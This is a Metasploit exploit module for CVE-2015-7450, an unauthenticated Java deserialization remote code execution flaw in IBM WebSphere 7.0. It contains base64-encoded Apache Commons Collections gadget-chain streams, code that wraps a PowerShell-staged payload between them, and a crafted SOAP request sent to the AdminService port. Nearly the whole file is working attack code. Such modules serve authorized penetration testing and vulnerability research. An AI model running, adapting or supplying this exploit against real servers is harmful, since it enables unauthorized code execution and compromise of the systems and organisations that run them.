##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "IBM WebSphere RCE Java Deserialization Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability in IBM's WebSphere Application Server. An unsafe deserialization
        call of unauthenticated Java objects exists to the Apache Commons Collections (ACC) library, which allows
        remote arbitrary code execution. Authentication is not required in order to exploit this vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
            'Liatsis Fotios @liatsisfotios'       # Metasploit Module
 
            # Thanks for helping me:
            # # # # # # # # # # # #
 
            # Kyprianos Vasilopoulos @kavasilo    # Implemented and reviewed - Metasploit module
            # Dimitriadis Alexios @AlxDm_         # Assistance and code check
            # Kotsiopoulos Panagiotis             # Guidance about Size and Buffer implementation
        ],
      'References'     =>
        [
            ['CVE', '2015-7450'],
            ['URL', 'https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java'],
            ['URL', 'http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability'],
            ['URL', 'https://www.tenable.com/plugins/index.php?view=single&id=87171']
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
            [ 'IBM WebSphere 7.0.0.0', {} ]
        ],
      'DisclosureDate' => "Nov 6 2015",
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
            'SSL'      => true,
            'WfsDelay' => 20
      }))
 
    register_options([
      OptString.new('TARGETURI', [true, 'The base IBM\'s WebSphere SOAP path', '/']),
      Opt::RPORT('8880')
    ], self.class)
  end
 
 
  def exploit
      # Decode - Generate - Set Payload / Send SOAP Request
      soap_request(set_payload)
  end
 
  def set_payload
      # CommonCollections1 Serialized Streams
      ccs_start = 
"rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQ="
      ccs_end = 
"dAAEZXhlY3VxAH4AHgAAAAFxAH4AI3NxAH4AEXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAEHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="
 
      # Generate Payload
      payload_exec = invoke_ccs(ccs_start) + gen_payload + invoke_ccs(ccs_end)
      payload_exec = Rex::Text.encode_base64(payload_exec)
  end
 
  def invoke_ccs(serialized_stream)
      # Decode Serialized Streams
      serialized_stream = Rex::Text.decode_base64(serialized_stream)
  end
 
  def gen_payload
      # Staging Native Payload
      exec_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
      exec_cmd = exec_cmd.gsub("%COMSPEC% /b /c start /b /min ", "")
 
      # Size up RCE - Buffer
      cmd_lng = exec_cmd.length
      lng2str = "0" + cmd_lng.to_s(16)
      buff = [lng2str].pack("H*")
 
      rce_pld = buff + exec_cmd
  end
 
  def soap_request(inject_payload)
      # SOAP Request
      req = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
      req += "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" 
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">" + "\r\n"
      req += "<SOAP-ENV:Header xmlns:ns0=\"admin\" ns0:WASRemoteRuntimeVersion=\"7.0.0.0\" ns0:JMXMessageVersion=\"1.0.0\" ns0:SecurityEnabled=\"true\" ns0:JMXVersion=\"1.2.0\">" + 
"\r\n"
      req += "<LoginMethod>BasicAuth</LoginMethod>" + "\r\n"
      req += "</SOAP-ENV:Header>" + "\r\n"
      req += "<SOAP-ENV:Body>" + "\r\n"
      req += "<ns1:getAttribute xmlns:ns1=\"urn:AdminService\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">" + "\r\n"
      req += "<objectname xsi:type=\"ns1:javax.management.ObjectName\">" + inject_payload + "</objectname>" + "\r\n"
      req += "<attribute xsi:type=\"xsd:string\">ringBufferSize</attribute>" + "\r\n"
      req += "</ns1:getAttribute>" + "\r\n"
      req += "</SOAP-ENV:Body>" + "\r\n"
      req += "</SOAP-ENV:Envelope>" + "\r\n"
 
      uri = target_uri.path
 
      res = send_request_raw({
          'method'      => 'POST',
          'version'     => '1.1',
          'raw_headers' => "Content-Type: text/xml; charset=utf-8" + "\r\n" + "SOAPAction: \"urn:AdminService\"" + "\r\n",
          'uri'         => normalize_uri(uri),
          'data'        => req
      })
  end
 
end
